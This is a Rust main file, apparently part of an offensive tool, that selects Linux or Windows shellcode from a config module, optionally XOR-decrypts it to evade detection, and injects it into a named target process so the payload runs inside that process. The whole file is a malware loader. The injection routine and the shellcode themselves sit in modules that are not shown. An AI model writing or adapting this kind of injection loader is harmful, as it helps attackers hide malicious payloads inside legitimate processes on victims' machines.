// Load the appropriate operating system's implementation
#[cfg(target_os = "linux")]
mod rco_process_migration_linux;

#[cfg(target_os = "linux")]
use rco_process_migration_linux::inject_and_migrate;

#[cfg(target_os = "linux")]
const TARGET_PROCESS: &str = rco_config::LINUX_MIGRATION_TARGET;

#[cfg(all(target_os = "linux", not(feature = "encrypted")))]
const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;

#[cfg(all(target_os = "linux", feature = "encrypted"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;


#[cfg(windows)]
mod rco_process_migration_windows;

#[cfg(windows)]
use rco_process_migration_windows::inject_and_migrate;

#[cfg(windows)]
const TARGET_PROCESS: &str = rco_config::WINDOWS_MIGRATION_TARGET;

#[cfg(all(windows, not(feature = "encrypted")))]
const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;

#[cfg(all(windows, feature = "encrypted"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;

fn main() {
    if cfg!(feature = "encrypted") {
        // Decrypt the shellcode so that it is usable
        let equalize = rco_utils::equalize_slice_len(rco_config::XOR_KEY, SHELLCODE);
        let xor_key: &[u8] = &equalize.0[..];
        let shellcode: &[u8] = &equalize.1[..];
        let shellcode = rco_utils::xor_u8_slices(xor_key, shellcode).unwrap();
        inject_and_migrate(&shellcode[..], TARGET_PROCESS);
    } else {
        inject_and_migrate(SHELLCODE, TARGET_PROCESS);
    }
}